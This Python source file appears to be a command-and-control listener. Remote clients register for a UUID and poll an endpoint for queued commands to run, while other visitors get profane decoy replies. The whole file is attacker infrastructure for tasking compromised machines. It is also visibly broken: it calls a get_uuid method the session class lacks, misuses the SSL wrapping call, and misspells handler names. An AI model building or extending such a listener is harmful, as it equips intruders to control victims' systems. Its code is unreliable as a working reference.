from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import json
import threading
import logger
import requests
import socket
import os
from urllib.parse import urlparse, parse_qs
import random
import uuid

log = logger.Logger(verbosity="debug")


class HTTPSession():
    def __init__(self, id, uuid, client_ip, secure=False):
        self.id = id
        self.uid = uuid
        self.client_address = client_ip
        self.secure = secure
        self.commands_queue = []


    def get_commands_queue(self):
        return self.commands_queue


class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        
        client_ip = self.client_address[0]
        client_port = self.client_address[1]
        log.info(f"New GET request from {client_ip}:{client_port}")

        # Parsing GET parameters
        parsed_url = urlparse(self.path)
        path = parsed_url.path
        query_params = parse_qs(parsed_url.query)
        # Example with curl http://localhost/1234/allo/?test=test&admin=user
        # Parsed url : ParseResult(scheme='', netloc='', path='/1234/allo', params='', query='test=test&admin=user', fragment='') 
        # path : /1234/allo 
        # query_params : {'test': ['test'], 'admin': ['user']}
        print(parsed_url, path, query_params)
        


        # Handling client's registration
        uris = path.strip("/").split("/")
        print(uris)
        try:
            endpoint = uris[0]
        except:
            log.error("No endpoint specified from HTTP request.")
            self.get_fucked()
            return
        
        if endpoint == "register":
            self.hanlde_register(client_ip)

        else:
            if endpoint in [session.get_uuid() for session in self.server.sessions.values()]:
                client_uuid = endpoint
                try:
                    action = uris[1]
                    if action == "get_command":
                        self.send_command(client_uuid)

                    else:
                        self.get_fucked()
                        return

                except:
                    log.error(f"No action requested from client {endpoint}.")
                    self.get_fucked()
                    return

            else:
                log.info(f"Unkown client : {client_ip}")
                self.get_fucked()
                return


    def send_command(self, client_uuid):
        commands_queue = self.server.sessions[client_uuid].get_commands_queue()
        
        if commands_queue:
            command = commands_queue.pop()
            response = {"status":"ok", "command":command}

        else:
            response = {"status":"empty"}

        self.send_response(200)
        self.send_header("Content-Type", "application/json") # adds a header
        self.end_headers() # adds the new line indicating the end of headers
        self.wfile.write(json.dumps(response).encode())


    def get_fucked(self):
        # Get fucked
        self.send_response(200)
        self.send_header("Content-Type", "text/plain") # adds a header
        self.end_headers() # adds the new line indicating the end of headers

        choices = [
            "They See What They've Been Told To See.", 
            "My Roads Leads Into The Desert.",
            "SILENCE!",
            "May Thy Knife Chip And Shatter."
        ]

        line = random.choice(choices)
        response = line + " Please get the fuck out."
        self.wfile.write(response.encode()) # Sends response body


    def hanlde_register(self, client_ip, secure=False):
        client_uuid = uuid.uuid4()

        self.server.add_session(client_uuid, client_ip, secure)

        # Tu dois renvoyer le uuid, pour que le client le connaisse
        self.send_response(200)
        self.send_header("Content-Type", "text/plain") # adds a header
        self.send_header("Auth", f"{client_uuid}") # adds a header
        self.end_headers() # adds the new line indicating the end of headers
        self.wfile.write(f"Register Successful! Welcome {client_uuid}".encode())
        return


    def do_POST(self):

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        try:
            data = json.loads(post_data)
            response = self.handle_command(data)

        except json.JSONDecodeError:
            response = {"status": "error", "message": "Invalid JSON format"}

        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(response).encode())

    
    def handle_command(self, data):
        command = data.get("command")
        if command == "ping":
            return {"status":"ok", "message":"pong"}
        
        elif command == "info":
            return {"status":"ok", "message":"HTTP/HTTPS Listener Active"}

        else:
            return {"status": "error", "message": "Unknown command"}
        

class HTTPServerWrapper(HTTPServer):
    def __init__(self, server_address, handler_class, use_https=False, certfile=None, keyfile=None):
        super().__init__(server_address, handler_class)
        
        self.ip = server_address[0]
        self.port = server_address[1]
        self.use_https = use_https
        self.certfile = certfile
        self.keyfile = keyfile
        self.sessions = {} # Dictionnaire avec id comme clef et valeurs HTTPSession : {<uuid4>:<HTTPSession>}
        self.running = False
        self.counter = 0

        if use_https and certfile and keyfile:
            self.socket = ssl.SSLContext.wrap_socket(
                self.socket,
                keyfile=keyfile,
                certfile=certfile,
                server_side=True
            )

        log.info(f"HTTPS server created for {self.ip}:{self.port}")


    def add_session(self, uuid, client_ip, secure):
        id = self.counter
        self.counter += 1

        session = HTTPSession(id, uuid, client_ip, secure)
        self.sessions[uuid] = session

        log.info(f"New http client (id:{id}) with uuid {uuid} registered")
        return


    def start(self):
        try:
            self.running = True
            self.serve_forever()
        
        except KeyboardInterrupt:
            log.warning("Server shutting down due to keyboard interrupt.")

        finally:
            self.stop()

        #thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        #thread.daemon = True # Ensures threads exit when main program ends
        #thread.start()
        #return thread
    

    def stop(self):
        self.running = False
        self.shutdown()
        self.server_close()
        log.info("HTTP Server stopped")

"""
class HTTPClient:
    def __init__(self, server_ip, server_port, use_https=False):
        self.server_ip = server_ip
        self.server_port = server_port
        self.protocol = "https" if use_https else "http"


    def send_command(self, command):
        url = f"{self.protocol}://{self.server_ip}:{self.server_port}"
        try:
            response = requests.post(url, json={"command": command})
            return response.json()
        
        except requests.exceptions.RequestException as e:
            return {"status": "error", "message": str(e)}
"""  

if __name__ == "__main__":
    server = HTTPServerWrapper(("0.0.0.0", 8888), HTTPHandler)
    server.start()

    



